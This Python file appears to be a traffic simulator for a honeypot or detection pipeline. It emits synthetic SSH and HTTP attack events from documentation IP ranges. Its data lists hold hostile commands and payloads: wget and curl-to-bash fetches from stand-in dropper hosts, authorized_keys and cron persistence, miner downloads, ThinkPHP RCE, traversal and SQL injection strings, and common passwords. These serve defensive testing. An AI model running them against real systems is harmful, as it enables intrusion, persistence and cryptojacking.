"""Traffic simulator.

Simulated sources use RFC documentation address ranges only. Simulated events
are ordinary events on the ordinary pipeline: nothing downstream can tell the
difference, which is exactly what makes the demo trustworthy.
"""

from __future__ import annotations

import asyncio
import random
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta

from .models import Event, EventType, Service, utcnow
from .sanitize import safe_text

DOC_PREFIXES = ("192.0.2.", "198.51.100.", "203.0.113.")
DOC_V6 = "2001:db8::"

COMMON_USERS = ["root", "admin", "user", "test", "guest", "ubuntu", "pi", "oracle", "mysql"]
COMMON_PASSWORDS = [
    "123456",
    "password",
    "admin",
    "root",
    "toor",
    "12345678",
    "qwerty",
    "abc123",
    "letmein",
    "welcome",
]
SPRAY_USERS = [
    "root", "admin", "user", "test", "guest", "ubuntu", "pi", "oracle", "mysql",
    "postgres", "ftp", "nobody", "www", "www-data", "deploy", "jenkins", "git",
    "tomcat", "weblogic", "administrator",
]
DROPPER_HOSTS = [
    "example.invalid",
    "cdn.example.invalid",
    "malicious.example.invalid",
    "185.199.108.153",
    "update.example.invalid",
]
SCANNER_PATHS = [
    "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/.env", "/.git/config",
    "/robots.txt", "/admin", "/actuator/env", "/server-status", "/api/v1/users",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/cgi-bin/.%2e/.%2e/bin/sh", "/solr/admin/info/system",
]
SCANNER_AGENTS = [
    "Mozilla/5.0 (compatible; Nuclei - Open-source project)",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 zgrab/0.x",
    "masscan/1.3",
    "curl/7.68.0",
]
EXPLOIT_PATHS = [
    "/index.php?s=/Index/think/app/invokefunction&function=call_user_func_array"
    "&vars[0]=system&vars[1][]=id",
    "/product?category[]=../../../../etc/passwd",
    "/items?id=1 OR 1=1--",
    "/cgi-bin/.%2e/.%2e/bin/sh",
    "/?file=php://filter/convert.base64-encode/resource=index",
    "/search?q=%27+UNION+SELECT+1,2,3--+",
]
TRANSFER_TEMPLATES = [
    "wget http://{host}/x86/shell -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    "curl -s http://{host}/payload.sh | bash",
    "tftp {host} -c get arm.sh",
    "ftpget {host} payload.bin /tmp/payload.bin",
]
RECON_COMMANDS = [
    "uname -a", "cat /etc/passwd", "ls -la", "ifconfig", "ip a", "ps aux",
    "df -h", "free -m", "uptime", "netstat -antp", "whoami", "id",
]
PERSISTENCE_COMMANDS = [
    "echo 'ssh-rsa AAAAB3Nz attacker@lab' >> ~/.ssh/authorized_keys",
    "crontab -l",
    "echo '* * * * * /tmp/.x' > /etc/cron.d/x",
    "cat ~/.bashrc",
]
MINER_COMMANDS = [
    "cd /tmp && wget http://{host}/xmrig.tar.gz && tar xf xmrig.tar.gz",
    "curl -o stratum http://{host}/s && ./s -o stratum+tcp://pool.example.invalid:3333 -u x",
]


@dataclass(slots=True)
class Profile:
    """One simulator profile."""

    name: str
    description: str
    generate: Callable[["Simulator"], Awaitable[None]]


@dataclass
class Simulator:
    """Generates simulated hostile traffic on the real pipeline."""

    pipeline: object
    profiles: tuple[str, ...] = ()
    rate: float = 5.0
    seed: int = 1337
    rng: random.Random = field(init=False)
    session: str = "sim"
    counter: int = field(default=0, init=False)
    emitted: int = field(default=0, init=False)

    def __post_init__(self) -> None:
        self.rng = random.Random(self.seed)

    # ---- helpers -------------------------------------------------------

    def _src_ip(self, index: int) -> str:
        prefix = DOC_PREFIXES[index % len(DOC_PREFIXES)]
        return f"{prefix}{(index // len(DOC_PREFIXES)) + 1}"

    def _next_session(self) -> str:
        self.counter += 1
        return f"sim-{self.counter:06d}"

    def _base(self, ip: str, event_type: EventType, *, session: str, ts: datetime) -> Event:
        return Event(
            ts=ts,
            service=Service.SSH if event_type in _SSH_TYPES else Service.HTTP,
            event_type=event_type,
            src_ip=ip,
            src_port=self.rng.randint(1024, 65535),
            session_id=session,
        )

    def _ssh_event(self, ip: str, event_type: EventType, session: str, ts: datetime, **fields: object) -> Event:
        event = self._base(ip, event_type, session=session, ts=ts)
        event.service = Service.SSH
        return event.model_copy(update={k: v for k, v in fields.items() if v is not None})

    def _http_event(self, ip: str, session: str, ts: datetime, **fields: object) -> Event:
        event = self._base(ip, EventType.HTTP_REQUEST, session=session, ts=ts)
        event.service = Service.HTTP
        event.http_method = safe_text(str(fields.get("http_method", "GET")), limit=16)
        event.path = safe_text(str(fields.get("path", "/")), limit=2048)
        event.query = safe_text(str(fields.get("query") or ""), limit=2048) or None
        event.user_agent = safe_text(str(fields.get("user_agent") or ""), limit=512) or None
        event.username = safe_text(str(fields.get("username") or ""), limit=256) or None
        event.password = safe_text(str(fields.get("password") or ""), limit=256) or None
        event.body_snippet = safe_text(str(fields.get("body_snippet") or ""), limit=1024) or None
        return event

    async def _emit(self, event: Event) -> None:
        submit = getattr(self.pipeline, "submit_async", None)
        if submit is not None:
            await submit(event, timeout=5.0)
        else:  # pragma: no cover - synchronous pipeline
            self.pipeline.submit(event)
        self.emitted += 1
        if self.rate > 0:
            await asyncio.sleep(1.0 / self.rate)

    # ---- profiles ------------------------------------------------------

    async def ssh_bruteforcer(self, ip: str, start: datetime) -> None:
        """Noisy repeated password guessing from one source."""
        session = self._next_session()
        await self._emit(self._base(ip, EventType.CONNECT, session=session, ts=start))
        for _ in range(14):
            start += timedelta(seconds=self.rng.uniform(0.4, 1.8))
            user = self.rng.choice(COMMON_USERS)
            await self._emit(
                self._ssh_event(
                    ip, EventType.LOGIN_ATTEMPT, session, start,
                    username=user, password=self.rng.choice(COMMON_PASSWORDS),
                )
            )

    async def credential_sprayer(self, ip: str, start: datetime) -> None:
        """Many distinct usernames from one source."""
        session = self._next_session()
        await self._emit(self._base(ip, EventType.CONNECT, session=session, ts=start))
        for user in SPRAY_USERS[:14]:
            start += timedelta(seconds=self.rng.uniform(1.0, 3.0))
            await self._emit(
                self._ssh_event(
                    ip, EventType.LOGIN_ATTEMPT, session, start,
                    username=user, password=self.rng.choice(COMMON_PASSWORDS),
                )
            )

    async def mirai_dropper(self, ip: str, start: datetime) -> None:
        """Login, then busybox probing and payload transfer."""
        session = self._next_session()
        await self._emit(self._base(ip, EventType.CONNECT, session=session, ts=start))
        for _ in range(5):
            start += timedelta(seconds=self.rng.uniform(0.5, 2.0))
            await self._emit(
                self._ssh_event(
                    ip, EventType.LOGIN_ATTEMPT, session, start,
                    username="root", password=self.rng.choice(COMMON_PASSWORDS),
                )
            )
        start += timedelta(seconds=1.0)
        await self._emit(
            self._ssh_event(ip, EventType.LOGIN_SUCCESS, session, start, username="root", password="123456")
        )
        commands = [
            "busybox",
            "uname -a",
            "cd /tmp && wget http://{}/mirai.arm -O mirai && chmod +x mirai".format(
                self.rng.choice(DROPPER_HOSTS)
            ),
            "tftp {host} -c get arm.sh".format(host=self.rng.choice(DROPPER_HOSTS)),
            "chmod 777 /tmp/mirai; /tmp/mirai",
            "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB lab' >> /root/.ssh/authorized_keys",
            "ps aux",
        ]
        for command in commands:
            start += timedelta(seconds=self.rng.uniform(0.8, 2.5))
            await self._emit(self._ssh_event(ip, EventType.COMMAND, session, start, command=command))

    async def web_scanner(self, ip: str, start: datetime) -> None:
        """Rapid path discovery with scanner user agents."""
        agent = self.rng.choice(SCANNER_AGENTS)
        for _ in range(18):
            start += timedelta(seconds=self.rng.uniform(0.2, 0.9))
            path = self.rng.choice(SCANNER_PATHS)
            await self._emit(
                self._http_event(ip, self._next_session(), start, path=path, user_agent=agent)
            )

    async def sql_traversal(self, ip: str, start: datetime) -> None:
        """SQL injection and traversal probing."""
        agent = self.rng.choice(SCANNER_AGENTS)
        for _ in range(10):
            start += timedelta(seconds=self.rng.uniform(0.5, 1.6))
            path = self.rng.choice(EXPLOIT_PATHS)
            await self._emit(
                self._http_event(ip, self._next_session(), start, path=path, user_agent=agent)
            )
        for _ in range(12):
            start += timedelta(seconds=self.rng.uniform(0.2, 0.7))
            await self._emit(
                self._http_event(
                    ip,
                    self._next_session(),
                    start,
                    http_method="POST",
                    path="/wp-login.php",
                    body_snippet=f"log=admin&pwd={self.rng.choice(COMMON_PASSWORDS)}",
                    username="admin",
                    password=self.rng.choice(COMMON_PASSWORDS),
                    user_agent=agent,
                )
            )

    async def persistent_attacker(self, ip: str, start: datetime) -> None:
        """Slow, low-and-slow reconnaissance then persistence and mining."""
        session = self._next_session()
        await self._emit(self._base(ip, EventType.CONNECT, session=session, ts=start))
        for _ in range(3):
            start += timedelta(seconds=self.rng.uniform(20.0, 60.0))
            await self._emit(
                self._ssh_event(
                    ip, EventType.LOGIN_ATTEMPT, session, start,
                    username="admin", password=self.rng.choice(COMMON_PASSWORDS),
                )
            )
        start += timedelta(seconds=30.0)
        await self._emit(
            self._ssh_event(ip, EventType.LOGIN_SUCCESS, session, start, username="admin", password="123456")
        )
        for command in RECON_COMMANDS[:6]:
            start += timedelta(seconds=self.rng.uniform(5.0, 20.0))
            await self._emit(self._ssh_event(ip, EventType.COMMAND, session, start, command=command))
        for command in PERSISTENCE_COMMANDS[:2]:
            start += timedelta(seconds=15.0)
            await self._emit(self._ssh_event(ip, EventType.COMMAND, session, start, command=command))
        start += timedelta(seconds=10.0)
        miner = MINER_COMMANDS[self.rng.randrange(len(MINER_COMMANDS))]
        await self._emit(
            self._ssh_event(
                ip, EventType.COMMAND, session, start,
                command=miner.format(host=self.rng.choice(DROPPER_HOSTS)),
            )
        )

    async def cross_service(self, ip: str, start: datetime) -> None:
        """One source probing both SSH and HTTP."""
        session = self._next_session()
        await self._emit(self._base(ip, EventType.CONNECT, session=session, ts=start))
        for _ in range(6):
            start += timedelta(seconds=self.rng.uniform(0.5, 2.0))
            await self._emit(
                self._ssh_event(
                    ip, EventType.LOGIN_ATTEMPT, session, start,
                    username=self.rng.choice(COMMON_USERS),
                    password=self.rng.choice(COMMON_PASSWORDS),
                )
            )
        for _ in range(8):
            start += timedelta(seconds=self.rng.uniform(0.4, 1.5))
            await self._emit(
                self._http_event(
                    ip,
                    self._next_session(),
                    start,
                    path=self.rng.choice(SCANNER_PATHS),
                    user_agent=self.rng.choice(SCANNER_AGENTS),
                )
            )

    # ---- orchestration -------------------------------------------------

    async def run(self, profiles: tuple[str, ...] | None = None, duration_s: float | None = None) -> int:
        """Run the selected profiles. Returns the number of events emitted."""
        selected = tuple(profiles or self.profiles or DEFAULT_ORDER)
        unknown = [p for p in selected if p not in PROFILES]
        if unknown:
            raise ValueError(
                f"unknown simulator profile(s): {', '.join(unknown)}. "
                f"Available: {', '.join(PROFILES)}"
            )
        self.emitted = 0
        ip_for = {name: self._src_ip(index + 1) for index, name in enumerate(PROFILES)}
        deadline = utcnow() + timedelta(seconds=duration_s) if duration_s else None

        while True:
            for name in selected:
                await getattr(self, _ATTRS[name])(ip_for[name], utcnow())
            if deadline is None or utcnow() >= deadline:
                break
        return self.emitted


_SSH_TYPES = frozenset(
    {EventType.CONNECT, EventType.DISCONNECT, EventType.LOGIN_ATTEMPT, EventType.LOGIN_SUCCESS, EventType.COMMAND}
)

PROFILES: dict[str, str] = {
    "ssh-bruteforcer": "Noisy SSH password guessing from one source",
    "credential-sprayer": "Many distinct usernames from a single source",
    "mirai-dropper": "Mirai-style login then busybox probing and payload transfer",
    "web-scanner": "Rapid sensitive path discovery with scanner user agents",
    "sql-traversal": "SQL injection and traversal probing against fake endpoints",
    "persistent-attacker": "Slow low-and-slow recon, persistence and mining indicators",
    "cross-service": "One source probing both SSH and HTTP",
}

DEFAULT_ORDER = ("ssh-bruteforcer", "credential-sprayer", "mirai-dropper", "web-scanner")

_ATTRS = {
    "ssh-bruteforcer": "ssh_bruteforcer",
    "credential-sprayer": "credential_sprayer",
    "mirai-dropper": "mirai_dropper",
    "web-scanner": "web_scanner",
    "sql-traversal": "sql_traversal",
    "persistent-attacker": "persistent_attacker",
    "cross-service": "cross_service",
}